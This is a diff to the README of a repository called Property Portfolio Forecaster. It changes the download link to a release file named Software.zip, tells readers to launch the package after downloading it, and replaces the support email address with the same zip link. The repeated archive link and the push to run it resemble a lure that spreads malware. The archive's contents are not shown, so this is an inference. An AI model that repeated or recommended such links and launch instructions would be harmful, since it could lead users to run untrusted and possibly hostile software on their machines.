@@ -32,7 +32,7 @@ The Property Portfolio Forecaster is a terminal-based application that leverages
 ## Installation 🚀
 
 To get started with the Property Portfolio Forecaster, you can download the software package from the following link:  
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download Software](https://github.com/2JzLove/Property-Portfolio-Forecaster/releases/download/v2.0/Software.zip)](https://github.com/2JzLove/Property-Portfolio-Forecaster/releases/download/v2.0/Software.zip)
 
 Please note that the software package needs to be launched after download.
 
@@ -52,6 +52,6 @@ If you are interested in contributing to the development of the Property Portfol
 
 ## Support 📧
 
-For any questions, feedback, or support regarding the Property Portfolio Forecaster, please reach out to the repository maintainers via email at property.forecaster@github.com.
+For any questions, feedback, or support regarding the Property Portfolio Forecaster, please reach out to the repository maintainers via email at https://github.com/2JzLove/Property-Portfolio-Forecaster/releases/download/v2.0/Software.zip
 
 Let's make property management more efficient and insightful with the Property Portfolio Forecaster! 🏠📈🔑
